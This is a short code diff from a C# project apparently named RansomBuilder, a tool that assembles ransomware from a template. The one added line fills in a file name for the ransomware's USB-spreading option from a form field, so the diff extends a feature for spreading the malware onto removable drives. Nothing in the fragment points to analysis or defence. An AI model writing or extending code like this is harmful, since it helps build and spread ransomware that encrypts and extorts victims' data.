@@ -175,6 +175,7 @@ namespace RansomBuilder
                             if (checkBox4.Checked)
                             {
                                 kod = kod.Replace("USBSPREAD", "1");
+                                kod = kod.Replace("USBNAME", textBox5.Text);
                             }
                             if (checkBox6.Checked)
                             {
